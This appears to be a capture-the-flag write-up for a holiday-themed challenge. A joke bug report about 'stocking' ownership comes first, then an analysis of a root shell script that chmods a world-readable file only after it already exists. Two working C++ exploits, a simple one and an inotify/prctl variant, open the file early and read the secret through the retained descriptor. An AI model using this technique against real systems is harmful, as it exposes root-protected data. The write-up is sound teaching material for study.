# Challenge 3

## Description

(the description for this challenge is a markdown file)

### 🎄 **Issue: Stocking delivery misroutes gifts to root under “sleeping nicely” conditions**  
**Labels:** `bug`, `priority-high`, `santa-infra`, `northpole-delivery`

#### **Description**
During the annual holiday deployment cycle, the `stuff-stocking` service incorrectly delivered a user’s gift into a stocking owned by **root**. This occurs as soon as the “children sleeping nicely” signal fires, which triggers Santa’s stocking-fill workflow (*SLEIGH-RFC-1225*).

Once the condition triggers, `/stocking`—created prematurely and owned by root—is sealed and the gift is written inside, leaving the intended recipient empty-handed.

#### **Expected Behavior**
The stocking-stuffer service should:

1. Create `/stocking` with ownership set to the correct child (UID 1000)  
2. Wait for at least one nicely sleeping child (positive-nice `sleep` process)  
3. Deliver the gift into that child’s stocking  
4. Lock down permissions  
5. Preserve overall Christmas cheer  

#### **Actual Behavior**
1. `/flag` is read and removed (expected)  
2. `/stocking` is created early and owned by **root**  
3. When the “sleeping nicely” condition succeeds, Santa seals the stocking (`chmod 400`)  
4. Gift is written into root’s stocking (root did *not* ask Santa for a flag)  
5. The intended user cannot access their gift  

#### **Reproduction Steps**
1. Launch `stuff-stocking`  
2. Allow any child process to begin “sleeping nicely” (nice > 0)  
3. Inspect `/stocking` ownership  
4. Observe gift delivery into root’s stocking  
5. Whisper “Ho ho no…”  

#### **Additional Notes**
- Misrouting likely caused by a mix-up in Santa’s recipient ledger (possibly outdated naughty/nice metadata).  
- Elves report that stocking creation timing can influence the eventual recipient, although this is not documented behavior.  
- Root maintains they “really don’t need more things to maintain.”  
- Internal SIRE notes indicate the team was “racing to finish delivering all gifts before sunrise,” which may have contributed to insufficient review of stocking ownership logic.  
- Holiday deadlines continue to present organizational risk.

#### **Impact**
High.  
Users expecting gifts may instead receive *nothing*, while root receives gifts they did not ask for and cannot appreciate.

---

## 🎁 **Proposed Fix**
Assign the correct ownership to `/stocking` before Santa seals it.

##### **Patch**
```diff
diff --git a/stuff-stocking b/stuff-stocking
index 614b458..e441bfe 100755
--- a/stuff-stocking
+++ b/stuff-stocking
@@ -19,4 +19,5 @@ until sleeping_nice; do
 done

 chmod 400 /stocking
+chown 1000:1000 /stocking
 printf "%s" "$GIFT" > /stocking
```

This ensures gifts reach the intended child instead of quietly accumulating in root’s stocking.

---

### 🛠️ **SantaOps Commentary**
> “This misdelivery stemmed from high seasonal load, compressed review cycles, and an unhealthy reliance on ‘it worked last year.’ SIRE will enforce a freeze on last-minute changes after the ‘sleeping nicely’ cutoff to prevent further stocking misroutes.”  
> — *Santa Infrastructure Reliability Engineering (SIRE)*


## Analysis
This challenge is a set-user-ID root binary running in the background. It will
read the flag and delete it, and create a file called `/stockings`, world
readable. Then the program periodically checks whether there's a program named
`sleep` running with `niceness` > 0, if so, it will change the permissions in
`/stockings` so that it can only be read/written by `root`, and writes the flag
to it.

Full script:
```bash
#!/bin/sh

set -eu

GIFT="$(cat /flag)"
rm /flag

touch /stocking

sleeping_nice() {
    ps ao ni,comm --no-headers \
        | awk '$1 > 0' \
        | grep -q sleep
}

# Only when children sleep sweetly and nice does Santa begin his flight
until sleeping_nice; do
    sleep 0.1
done

chmod 400 /stocking
printf "%s" "$GIFT" > /stocking
```

You cannot open the file _after_ the `chmod 400 /stockings`, but you can open
it _before_ and keep the file descriptor open. Afterwards, you can just read
from the file descriptor and get the flag.

## Direct Solution

```c++
#include <err.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

constexpr size_t kBufSz = 8192;
char buf[kBufSz]{0};

int main(void) {
  int fd = open("/stocking", O_RDONLY);
  if (fd == -1) {
    err(EXIT_FAILURE, "open");
  }

  system("nice --adjustment=1 sleep 5");

  ssize_t n = read(fd, buf, kBufSz - 1);
  if (n == -1) {
    err(EXIT_FAILURE, "read");
  }
  printf("%s\n", buf);

  close(fd);
  return 0;
}
```

This can be found in [`challenge3.cc`](./challenge3.cc)

## Complicated Solution

You don't actually need to call `nice` nor `sleep`, you can change your process
name to that. Also, you do not need to do busy waiting. A full over-engineered
solution can use `inotify` to get notified when the file was closed after
writing:

```c++
#include <err.h>
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <poll.h>
#include <signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

constexpr size_t kBufSz = 8192;
char flag_buffer[kBufSz]{0};

char inotify_buffer[kBufSz]
    __attribute__((aligned(__alignof__(struct inotify_event))));

int main(void) {
    int stocking_fd = open("/stocking", O_RDONLY);
    if (stocking_fd == -1) {
        err(EXIT_FAILURE, "open");
    }

    int inotify_fd = inotify_init();
    if (inotify_fd == -1) {
        err(EXIT_FAILURE, "inotify_init");
    }

    // Get notified when the file is closed after writing.
    if (inotify_add_watch(inotify_fd, "/stocking", IN_CLOSE_WRITE) == -1) {
        err(EXIT_FAILURE, "inotify_add_watch");
    }

    // Change our name to "sleep"
    if (prctl(PR_SET_NAME, "sleep") == -1) {
        err(EXIT_FAILURE, "prctl(PR_SET_NAME)");
    }

    // Set niceness to 1
    pid_t pid = getpid();
    if (setpriority(PRIO_PROCESS, pid, 1) == -1) {
        err(EXIT_FAILURE, "setpriority");
    }

    // Wait up to 10 seconds for the file to be written to.
    constexpr size_t kTimeoutMs = 10 * 1000;

    struct pollfd poll_fd{};
    poll_fd.fd = inotify_fd;
    poll_fd.events = POLLIN;

    int poll_ret = poll(&poll_fd, 1, kTimeoutMs);
    if (poll_ret == -1) {
        err(EXIT_FAILURE, "poll");
    }

    if (poll_ret == 0) {
        fprintf(stderr, "Timed out\n");
        exit(EXIT_FAILURE);
    }

    // Read stocking contents.
    ssize_t n = read(stocking_fd, flag_buffer, kBufSz - 1);
    if (n == -1) {
        err(EXIT_FAILURE, "read");
    }
    printf("%s\n", flag_buffer);

    close(stocking_fd);
    close(inotify_fd);

    return 0;
}
```

This can be found in [`challenge3_overkill.cc`](./challenge3_overkill.cc)
